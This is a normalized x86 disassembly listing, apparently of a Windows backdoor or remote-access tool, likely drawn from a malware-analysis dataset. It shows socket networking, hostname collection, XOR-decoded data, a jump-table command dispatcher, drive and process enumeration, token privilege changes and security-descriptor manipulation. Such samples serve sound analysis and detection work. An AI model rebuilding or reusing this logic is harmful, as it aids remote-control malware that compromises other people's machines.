mov edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov ebp ecx
mov esi edi
or ecx 0xffffffff
mov edi ebx
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi [ esp + 0x28 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
dec edi
mov ecx ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
pop ebp
and ecx 0x3
cmp edx 0x1
[ edi ] [ esi ]
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebx
add esp 0x10
retn
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
push 0xa
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
mov ecx [ esp + 0x3c ]
push ecx
call sub_410496
lea edi [ esp + 0x18 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
sub_403a50
mov eax 0x2008
call sub_4094d0
push ebx
mov ebx [ Ordinal_WSOCK32_16@IAT ]
push ebp
push esi
xor ebp ebp
push edi
mov edi [ esp + 0x201c ]
mov [ esp + 0x10 ] ebp
mov [ esp + 0x14 ] ebp
lea esi [ esp + 0x18 ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x2008
retn
cmp eax 0xffffffff
jne r-xdata
mov al [ esi ]
cmp al 0xd
je r-xdata
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
mov eax [ esp + 0x10 ]
inc eax
cmp eax 0x4
mov [ esp + 0x10 ] eax
jge r-xdata
cmp al 0xa
je r-xdata
push 0x1
call [ rw-data ]
mov eax [ esp + 0x14 ]
mov ecx eax
inc eax
cmp ecx 0x1388
mov [ esp + 0x14 ] eax
jg r-xdata
lea edx [ esp + 0x18 ]
push rw-data
push edx
mov [ esp + ebp + 0x21 ] 0x0
call sub_4093b0
add esp 0x8
neg eax
sbb eax eax
pop edi
and eax 0x2
pop esi
pop ebp
dec eax
pop ebx
add esp 0x2008
retn
inc ebp
inc esi
cmp ebp 0x2000
ja r-xdata
mov [ esp + 0x10 ] 0x0
jmp r-xdata
jmp r-xdata
push 0x1
call [ rw-data ]
jmp r-xdata
push 0x0
push 0x1
push esi
push edi
call ebx
test eax eax
je r-xdata
sub_403b30
mov eax [ esp + 0x10 ]
push esi
mov esi [ esp + 0xc ]
test esi esi
mov [ eax ] esi
jle r-xdata
pop esi
retn
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x8 ]
sub ecx eax
mov dl [ ecx + eax ]
xor dl 0x23
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
sub_403b60
sub esp 0x104
push esi
lea eax [ esp + 0x4 ]
push edi
push eax
push rw-data
mov [ esp + 0x10 ] 0xff
call [ GetComputerNameA@IAT ]
mov ecx [ esp + 0x8 ]
lea edx [ esp + 0xc ]
push 0xff
push edx
mov [ ecx + rw-data ] 0x0
call [ Ordinal_WSOCK32_57@IAT ]
test eax eax
jne r-xdata
mov edi rw-data
lea eax [ esp + 0xc ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x104
retn
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ Ordinal_WSOCK32_11@IAT ]
mov edi eax
jmp r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
add esp 0x104
retn
sub_403c20
mov eax [ esp + 0x4 ]
push eax
call [ Ordinal_WSOCK32_52@IAT ]
test eax eax
je r-xdata
xor eax eax
retn
mov ecx [ eax + 0xc ]
mov edx [ ecx ]
mov eax [ edx ]
push eax
call [ Ordinal_WSOCK32_11@IAT ]
retn
sub_403c50
mov eax [ rw-data ]
sub esp 0x124
test eax eax
push ebx
mov ebx [ Ordinal_WSOCK32_9@IAT ]
push ebp
mov ebp [ Ordinal_WSOCK32_18@IAT ]
push esi
push edi
mov edi [ Ordinal_WSOCK32_12@IAT ]
mov esi 0x1
jne r-xdata
push 0x0
push esi
push 0x2
call [ Ordinal_WSOCK32_23@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
push 0x0
push esi
push 0x2
mov [ rw-data ] 0x0
call [ Ordinal_WSOCK32_23@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] esi
push ecx
push 0x8004667e
push eax
call edi
mov ax [ rw-data ]
mov edx [ rw-data ]
push eax
mov [ esp + 0x18 ] 0x3c
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x38 ] edx
mov [ esp + 0x34 ] esi
mov [ esp + 0x20 ] 0x2
call ebx
push rw-data
mov [ esp + 0x22 ] ax
call [ Ordinal_WSOCK32_10@IAT ]
mov edx [ rw-data ]
lea ecx [ esp + 0x1c ]
push 0x10
push ecx
push edx
mov [ esp + 0x2c ] eax
call [ rw-data ]
mov edx [ rw-data ]
lea eax [ esp + 0x14 ]
push eax
lea ecx [ esp + 0x34 ]
push 0x0
push ecx
inc edx
push 0x0
push edx
call ebp
test eax eax
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
lea ecx [ esp + 0x10 ]
mov [ esp + 0x10 ] esi
push ecx
push 0x8004667e
push eax
call edi
mov ax [ rw-data ]
mov edx [ rw-data ]
push eax
mov [ esp + 0x18 ] 0x3c
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x38 ] edx
mov [ esp + 0x34 ] esi
mov [ esp + 0x20 ] 0x2
call ebx
mov ecx [ rw-data ]
mov [ esp + 0x1e ] ax
mov eax [ rw-data ]
lea edx [ esp + 0x1c ]
push 0x10
push edx
push eax
mov [ esp + 0x2c ] ecx
call [ rw-data ]
mov eax [ rw-data ]
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x34 ]
push 0x0
push edx
inc eax
push 0x0
push eax
call ebp
test eax eax
jg r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
mov [ rw-data ] esi
mov eax [ rw-data ]
push eax
call [ Ordinal_WSOCK32_3@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
call sub_404410
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x124
retn
lea ecx [ esp + 0x2c ]
push ecx
push 0x0
push 0x0
push sub_4041c0
push 0x0
push 0x0
call [ CreateThread@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
push eax
call [ rw-data ]
mov [ rw-data ] 0x0
pop edi
pop esi
pop ebp
pop ebx
add esp 0x124
retn
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x124
retn
mov edx [ rw-data ]
push edx
call [ Ordinal_WSOCK32_3@IAT ]
sub_403e80
sub esp 0x100
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov ebx eax
call [ FreeLibrary@IAT ]
mov ecx [ rw-data ]
mov esi [ rw-data ]
mov edi [ rw-data ]
mov eax ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
movsx edx [ rw-data ]
mov ecx [ rw-data ]
xor esi esi
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] esi
mov [ rw-data ] esi
call ebx
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0xffffffbf
cmp eax 0x25
ja r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1
cmp eax esi
je r-xdata
jmp [ eax * 4 + jump_table_404060 ]
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x100
retn
mov edi rw-data
or ecx 0xffffffff
xor eax eax
mov [ rw-data ] esi
[ edi ]
not ecx
add ecx 0x4
mov edi rw-data
mov [ esp + 0xd ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x11 ]
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0xc ] 0x5a
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
add ecx 0x4
push ecx
lea ecx [ esp + 0x10 ]
push ecx
call sub_403320
add esp 0x8
call sub_405150
jmp r-xdata
call sub_404ee0
jmp r-xdata
call sub_404f00
jmp r-xdata
call sub_404eb0
jmp r-xdata
call sub_404e40
jmp r-xdata
call sub_4049a0
jmp r-xdata
call sub_405020
jmp r-xdata
call sub_4058a0
jmp r-xdata
call sub_405060
jmp r-xdata
call sub_405110
jmp r-xdata
call sub_4050f0
jmp r-xdata
call sub_405e10
jmp r-xdata
push 0x4e
call sub_405e30
add esp 0x4
jmp r-xdata
call sub_405f70
jmp r-xdata
call sub_4060e0
jmp r-xdata
call sub_405e80
jmp r-xdata
call sub_407010
jmp r-xdata
call sub_406470
jmp r-xdata
mov [ rw-data ] esi
jmp r-xdata
call sub_406f00
jmp r-xdata
call sub_4074f0
jmp r-xdata
call sub_407580
jmp r-xdata
call sub_4075c0
jmp r-xdata
call sub_407620
jmp r-xdata
call sub_407660
sub_404100
push esi
mov esi [ WaitForSingleObject@IAT ]
mov ecx [ rw-data ]
push ecx
call [ rw-data ]
call [ Ordinal_WSOCK32_116@IAT ]
push 0x1
call sub_409054
pop esi
nop
nop
nop
push ebx
push esi
push edi
push rw-data
call [ LoadLibraryA@IAT ]
mov esi eax
push rw-data
push esi
call [ GetProcAddress@IAT ]
push esi
mov ebx eax
call [ FreeLibrary@IAT ]
call ebx
mov edi eax
mov [ rw-data ] edi
push 0x3e8
call [ rw-data ]
jmp r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
retn 0x4
call ebx
mov esi eax
sub eax edi
cmp eax 0xea60
jbe r-xdata
mov eax [ rw-data ]
push 0x0
push eax
call esi
test eax eax
je r-xdata
call ebx
sub eax [ rw-data ]
cmp eax 0x1b7740
jbe r-xdata
call sub_402df0
mov edi esi
push 0xa
call [ rw-data ]
jmp r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] esi
mov eax [ rw-data ]
test eax eax
je r-xdata
sub_4041c0
mov eax 0x2004
call sub_4094d0
push ebx
push ebp
mov ebp [ esp + 0x8 ]
xor ebx ebx
push esi
push edi
mov [ rw-data ] ebx
mov al [ esp + 0x14 ]
call sub_404310
test eax eax
je r-xdata
mov [ rw-data ] bl
mov edi [ rw-data ]
mov ecx eax
lea esi [ esp + 0x14 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
sub ebp [ rw-data ]
cmp ebp ebx
jg r-xdata
cmp [ rw-data ] ebx
jne r-xdata
lea eax [ esp + 0x14 ]
push 0x5
push eax
call sub_404390
add esp 0x8
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
pop ebp
mov [ rw-data ] 0x1
xor eax eax
pop ebx
add esp 0x2004
retn 0x4
mov [ rw-data ] ebx
mov [ rw-data ] ebx
cmp [ rw-data ] ebx
jne r-xdata
mov ebp [ esp + 0x15 ]
cmp ebp 0x5
jl r-xdata
push 0x1
call [ rw-data ]
cmp [ rw-data ] ebx
jne r-xdata
cmp ebp ebx
jg r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
push 0x1
call [ rw-data ]
cmp [ rw-data ] ebx
je r-xdata
cmp [ rw-data ] bl
jne r-xdata
mov al [ esp + 0x14 ]
cmp al 0x5a
jne r-xdata
lea edx [ esp + 0x14 ]
push ebp
push edx
call sub_404390
add esp 0x8
cmp eax 0xffffffff
mov [ rw-data ] eax
je r-xdata
mov [ rw-data ] bl
jmp r-xdata
mov [ rw-data ] 0x1
cmp al 0x51
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
mov [ rw-data ] al
sub ebp 0x5
mov [ rw-data ] ebx
mov ecx [ rw-data ]
push ecx
call [ rw-data ]
jmp r-xdata
sub_404310
push ecx
push ebx
mov ebx [ Ordinal_WSOCK32_111@IAT ]
push esi
mov esi [ Ordinal_WSOCK32_16@IAT ]
push edi
xor edi edi
test eax eax
jle r-xdata
call ebx
cmp eax 0x2733
jne r-xdata
push 0x1
call [ rw-data ]
jmp r-xdata
mov al [ esp + 0xf ]
cmp al 0xd
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
pop ecx
retn
push 0x1
call [ rw-data ]
jmp r-xdata
mov ecx [ rw-data ]
push 0x0
lea eax [ esp + 0x13 ]
push 0x1
push eax
push ecx
call esi
cmp eax 0xffffffff
jne r-xdata
inc edi
cmp edi 0x4
jge r-xdata
cmp al 0xa
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ecx
retn
push 0x1
xor edi edi
call [ rw-data ]
jmp r-xdata
sub_404390
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
xor esi esi
xor ebx ebx
cmp edi 0x2000
jle r-xdata
test edi edi
jle r-xdata
mov edi 0x2000
jmp r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
retn
mov ebp [ esp + 0x14 ]
add esi eax
xor ebx ebx
call [ Ordinal_WSOCK32_111@IAT ]
cmp eax 0x2733
jne r-xdata
mov edx [ rw-data ]
mov eax edi
sub eax esi
push 0x0
lea ecx [ esi + ebp ]
push eax
push ecx
push edx
call [ Ordinal_WSOCK32_16@IAT ]
test eax eax
jg r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
retn
mov eax ebx
inc ebx
cmp eax 0x1770
jg r-xdata
jmp r-xdata
push 0x1
call [ rw-data ]
cmp esi edi
jl r-xdata
sub_404410
sub esp 0x48c
push ebp
push esi
push edi
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x9d ]
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x98 ] 0x41
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
lea edx [ esp + 0x298 ]
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push edx
mov ebp ecx
mov ecx [ rw-data ]
add ebp 0x6
push 0x200
mov [ esp + 0x18 ] 0x0
mov [ esp + ebp + 0xa0 ] ecx
add ebp 0x4
call [ GetLogicalDriveStringsA@IAT ]
test eax eax
je r-xdata
lea edx [ esp + 0x98 ]
push ebp
push edx
mov [ esp + 0xa1 ] ebp
call sub_403320
add esp 0x8
pop edi
pop esi
pop ebp
add esp 0x48c
retn
mov al [ esp + 0x298 ]
test al al
je r-xdata
push ebx
lea ebx [ esp + 0x29c ]
mov [ esp + 0x1c ] 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x30 ]
push 0x80
push ecx
push ebx
call [ GetVolumeInformationA@IAT ]
test eax eax
jne r-xdata
mov edi ebx
or ecx 0xffffffff
xor eax eax
lea esi [ esp + ebp + 0x9c ]
[ edi ]
not ecx
dec ecx
mov edi ebx
mov edx ecx
or ecx 0xffffffff
inc edx
mov [ esp + 0x10 ] esi
[ edi ]
not ecx
sub edi ecx
push ebx
mov eax ecx
mov esi edi
mov edi [ esp + 0x14 ]
mov [ esp + 0x1c ] edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
add ebp edx
and ecx 0x3
[ edi ] [ esi ]
call [ GetDriveTypeA@IAT ]
cmp eax 0x2
mov [ esp + 0x10 ] eax
je r-xdata
pop ebx
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + ebp + 0x9c ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
[ edi ]
not ecx
mov eax [ esp + 0x14 ]
dec ecx
lea ebp [ ecx + ebp + 0x1 ]
mov ecx [ esp + 0x10 ]
mov [ esp + ebp + 0x9c ] ecx
mov ecx [ esp + 0x18 ]
add eax ecx
add ebp 0x4
mov [ esp + 0x14 ] eax
lea ebx [ esp + eax + 0x29c ]
mov al [ esp + eax + 0x29c ]
test al al
jne r-xdata
sub_4045b0
sub esp 0x2c
mov ecx [ esp + 0x34 ]
lea edx [ esp ]
mov [ esp + 0xc ] ecx
push ebx
lea ecx [ esp + 0x38 ]
xor ebx ebx
mov [ esp + 0x2c ] edx
push ecx
lea edx [ esp + 0x14 ]
mov eax 0x1
push ebx
push edx
push eax
mov [ esp + 0x14 ] al
mov [ esp + 0x15 ] al
mov [ esp + 0x16 ] bl
mov [ esp + 0x17 ] bl
mov [ esp + 0x18 ] bl
mov [ esp + 0x19 ] bl
mov [ esp + 0x1a ] bl
mov [ esp + 0x1b ] al
mov [ esp + 0x1c ] ebx
mov [ esp + 0x24 ] 0x2
mov [ esp + 0x28 ] ebx
mov [ esp + 0x2c ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x34 ] ebx
mov [ esp + 0x38 ] eax
mov [ esp + 0x48 ] ebx
call SetEntriesInAclA
test eax eax
jne r-xdata
xor eax eax
pop ebx
add esp 0x2c
retn
mov eax [ esp + 0x38 ]
mov ecx [ esp + 0x34 ]
push esi
push ebx
push eax
push ebx
push ebx
push 0x4
push 0x6
push ecx
call SetSecurityInfo
mov edx [ esp + 0x3c ]
mov esi eax
push edx
call [ LocalFree@IAT ]
xor eax eax
cmp esi ebx
pop esi
pop ebx
sete al
add esp 0x2c
retn
sub_404660
sub esp 0x10
mov ecx [ esp + 0x18 ]
lea eax [ esp + 0x4 ]
push eax
push ecx
push 0x0
mov [ esp + 0xc ] 0x1
mov [ esp + 0x18 ] 0x2
call [ LookupPrivilegeValueA@IAT ]
test eax eax
je r-xdata
xor eax eax
add esp 0x10
retn
mov eax [ esp + 0x1c ]
lea edx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x18 ]
push eax
lea ecx [ esp + 0x8 ]
push 0x10
push ecx
push 0x0
push edx
mov [ esp + 0x30 ] 0x10
call [ AdjustTokenPrivileges@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor ecx ecx
cmp eax 0x514
setne cl
mov eax ecx
add esp 0x10
retn
sub_4046f0
sub esp 0x220
push ebx
push ebp
mov ebp [ esp + 0x230 ]
push esi
push edi
mov edi [ esp + 0x234 ]
push edi
push 0x0
push ebp
call [ rw-data ]
test eax eax
mov [ esp + 0x18 ] eax
jne r-xdata
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x220
retn
push edi
push eax
push 0x40000
call [ rw-data ]
mov esi [ GetCurrentProcess@IAT ]
mov ebx [ DuplicateHandle@IAT ]
test eax eax
mov [ esp + 0x10 ] eax
jne r-xdata
push ebp
push eax
call sub_4045b0
add esp 0x8
lea edx [ esp + 0x18 ]
push 0x0
push 0x0
push ebp
push edx
call esi
push eax
mov eax [ esp + 0x24 ]
push eax
call esi
push eax
call ebx
test eax eax
jne r-xdata
lea eax [ esp + 0x14 ]
push eax
push 0x28
call esi
push eax
call [ OpenProcessToken@IAT ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x10 ]
push ecx
call [ rw-data ]
mov [ esp + 0x18 ] eax
mov edx [ esp + 0x14 ]
lea ecx [ esp + 0x20 ]
push ecx
push rw-data
push edx
call sub_404660
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x220
retn
mov ecx [ esp + 0x14 ]
push ecx
call [ rw-data ]
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push edi
push 0x0
push 0x80000
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
mov eax [ esp + 0x14 ]
lea edx [ esp + 0x20 ]
push edx
push eax
call sub_4046d0
add esp 0x8
mov edx [ esp + 0x14 ]
lea eax [ esp + 0x1c ]
push eax
lea ecx [ esp + 0x34 ]
push 0x200
push ecx
push 0x1
push edx
mov [ esp + 0x30 ] 0x200
call [ GetTokenInformation@IAT ]
test eax eax
je r-xdata
push edi
call [ rw-data ]
mov eax [ esp + 0x30 ]
push 0x0
push 0x0
push 0x0
push eax
push 0x1
push 0x6
push edi
call SetSecurityInfo
test eax eax
jne r-xdata
push eax
push eax
lea ecx [ esp + 0x18 ]
push 0x40000
push ecx
call esi
push eax
push edi
call esi
push eax
call ebx
test eax eax
jne r-xdata
mov [ esp + 0x10 ] eax
sub_404870
sub esp 0x104
push ebx
mov ebx [ esp + 0x10c ]
push ebp
push esi
test ebx ebx
push edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
cmp [ ebx ] 0x0
je r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov ebp ecx
or ecx 0xffffffff
[ edi ]
not ecx
push ebp
dec ecx
push rw-data
push ebx
mov esi ecx
call sub_409500
add esp 0xc
test eax eax
jne r-xdata
push esi
push rw-data
push ebx
call sub_409500
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esp + 0x10 ]
push 0x104
push eax
call [ rw-data ]
test eax eax
je r-xdata
lea edi [ esi + ebx ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ ebx + ebp ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x104
retn
sub_4049a0
mov eax 0x2744
call sub_4094d0
mov eax [ rw-data ]
push ebx
push esi
xor esi esi
cmp eax 0x2
push edi
mov ebx 0x5
mov [ esp + 0x750 ] 0x43
mov [ esp + 0xc ] esi
mov [ esp + 0x14 ] esi
mov [ esp + 0x10 ] esi
jne r-xdata
push ebp
push 0x0
push 0x2
call [ rw-data ]
mov ebp eax
cmp ebp 0xffffffff
mov [ esp + 0x20 ] ebp
je r-xdata
push rw-data
call [ LoadLibraryA@IAT ]
cmp eax esi
mov [ esp + 0xc ] eax
je r-xdata
mov [ esp + 0x755 ] ebx
jmp r-xdata
lea eax [ esp + 0x2c ]
mov [ esp + 0x2c ] 0x128
push eax
push ebp
call [ rw-data ]
test eax eax
jne r-xdata
mov esi [ GetProcAddress@IAT ]
mov edi eax
push rw-data
push edi
call esi
push rw-data
push edi
mov [ esp + 0x1c ] eax
call esi
mov [ esp + 0x10 ] eax
cmp ebp 0xffffffff
je r-xdata
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x154 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x34 ]
push ecx
push 0x0
push 0x410
call [ rw-data ]
mov esi eax
push esi
call [ GetPriorityClass@IAT ]
push esi
call [ rw-data ]
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebp
test eax eax
je r-xdata
push ebp
call [ rw-data ]
cmp [ rw-data ] 0x1
jne r-xdata
mov edx [ esp + 0x34 ]
push 0x410
push edx
call sub_4046f0
add esp 0x8
mov ebp eax
lea eax [ esp + 0x28 ]
lea ecx [ esp + 0x1c ]
push eax
push 0x4
push ecx
push ebp
call [ esp + 0x28 ]
test eax eax
je r-xdata
lea eax [ esp + 0x750 ]
push ebx
push eax
mov [ esp + 0x759 ] ebx
call sub_403320
add esp 0x8
pop edi
pop esi
pop ebx
add esp 0x2744
retn
push eax
call [ FreeLibrary@IAT ]
mov eax [ esp + 0x34 ]
test eax eax
jne r-xdata
lea edi [ esp + 0x50 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x454 ]
[ edi ]
not ecx
sub edi ecx
push 0x5c
mov eax ecx
mov esi edi
mov edi edx
mov [ esp + 0x28 ] 0x100
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x158 ]
push ecx
call sub_409000
add esp 0x8
inc eax
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x654 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x154 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x654 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x354 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
